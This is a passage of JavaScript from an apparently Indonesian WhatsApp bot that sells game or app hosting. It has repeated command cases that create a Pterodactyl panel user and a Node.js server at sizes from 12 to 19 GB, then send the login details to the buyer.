ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "19gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "19GB"
let egg = global.eggsnya
let loc = global.location
let memo = "19240"
let cpu = "500"
let disk = "19240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "18gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "18GB"
let egg = global.eggsnya
let loc = global.location
let memo = "18240"
let cpu = "480"
let disk = "18240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "17gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "17GB"
let egg = global.eggsnya
let loc = global.location
let memo = "17240"
let cpu = "450"
let disk = "17240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "15gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15GB"
let egg = global.eggsnya
let loc = global.location
let memo = "15240"
let cpu = "420"
let disk = "15240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "16gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "16GB"
let egg = global.eggsnya
let loc = global.location
let memo = "16240"
let cpu = "410"
let disk = "16240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "14gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14GB"
let egg = global.eggsnya
let loc = global.location
let memo = "14240"
let cpu = "360"
let disk = "14240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "13gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13GB"
let egg = global.eggsnya
let loc = global.location
let memo = "13240"
let cpu = "230"
let disk = "13240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "12gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12GB"
let egg = global.eggsnya
let loc = global.location
let memo = "12240"
let cpu = "310"
let disk = "12240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "11gbb": {
